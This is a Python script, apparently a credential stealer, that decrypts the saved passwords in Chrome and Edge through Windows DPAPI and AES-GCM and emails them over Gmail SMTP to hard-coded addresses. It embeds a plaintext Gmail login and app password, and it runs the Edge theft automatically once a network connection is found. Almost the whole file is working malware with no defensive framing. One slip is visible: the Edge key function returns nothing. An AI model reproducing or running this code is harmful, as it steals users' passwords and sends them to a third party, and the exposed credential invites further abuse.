import base64
import json
import os
import shutil
import smtplib
import sqlite3
import urllib.request
from datetime import datetime, timedelta
from time import sleep

import win32crypt
from Crypto.Cipher import AES


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def get_encryption_key_edge():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Microsoft", "Edge",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        return str(win32crypt.CryptUnprotectData(key[1][1:], None, None, None, 0)[1])


def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    lista = ['SENHAS↓↓↓\n\n']
    separador = '=' * 50, '\n'
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")

            lista.append(f"Origin URL: {origin_url}\n")
            lista.append(f"Action URL: {action_url}\n")
            lista.append(f"Username: {username}\n")
            lista.append(f"Password: {password}\n")
            lista.append(separador)

        else:
            continue
        if date_created != 86400000000 and date_created:
            date = f"Creation date: {str(get_chrome_datetime(date_created))}"
            lista.append(f"{date}\n")
            print(date)

        if date_last_used != 86400000000 and date_last_used:
            lastUsed = f"Last Used: {str(get_chrome_datetime(date_last_used))}"
            lista.append(f"{lastUsed}\n\n")
            print(lastUsed)
        lista.append("\n")
        print("="*50)

    result = ''.join(''.join(map(str, tup)) for tup in lista)

    def enviaInformacao():
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login("jeffersonssantos93@gmail.com", "oeqlpaolofrrucef")
        server.sendmail('jeffersonssantos@gmail.com',
                        'jeffersonssantos93@gmail.com', result.encode('utf-8'))

        server.sendmail('jeffersonssantos@gmail.com',
                        'jeffersonssantos92@gmail.com', result.encode('utf-8'))

        server.quit()
    print(result)
    enviaInformacao()
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def main_edge():
    # get the AES key
    key = get_encryption_key_edge()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Microsoft", "Edge", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    lista = ['SENHAS EDGE↓↓↓\n\n']
    separador = '=' * 50, '\n'
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")

            lista.append(f"Origin URL: {origin_url}\n")
            lista.append(f"Action URL: {action_url}\n")
            lista.append(f"Username: {username}\n")
            lista.append(f"Password: {password}\n")
            lista.append(separador)

        else:
            continue
        if date_created != 86400000000 and date_created:
            date = f"Creation date: {str(get_chrome_datetime(date_created))}"
            lista.append(f"{date}\n")
            print(date)

        if date_last_used != 86400000000 and date_last_used:
            lastUsed = f"Last Used: {str(get_chrome_datetime(date_last_used))}"
            lista.append(f"{lastUsed}\n\n")
            print(lastUsed)
        lista.append("\n")
        print("="*50)

    result = ''.join(''.join(map(str, tup)) for tup in lista)

    def enviaInformacaoEdge():
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login("jeffersonssantos93@gmail.com", "oeqlpaolofrrucef")
        server.sendmail('jeffersonssantos@gmail.com',
                        'jeffersonssantos93@gmail.com', result.encode('utf-8'))

        server.sendmail('jeffersonssantos@gmail.com',
                        'jeffersonssantos92@gmail.com', result.encode('utf-8'))

        server.quit()
    print(result)
    enviaInformacaoEdge()
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def connect(host='https://mail.google.com/'):
    try:
        urllib.request.urlopen(host)  # Python 3.x
        return True

    except:
        return False


while connect() == False:
    print('erro de conexão')
    sleep(1.5)
if connect():
    main_edge()
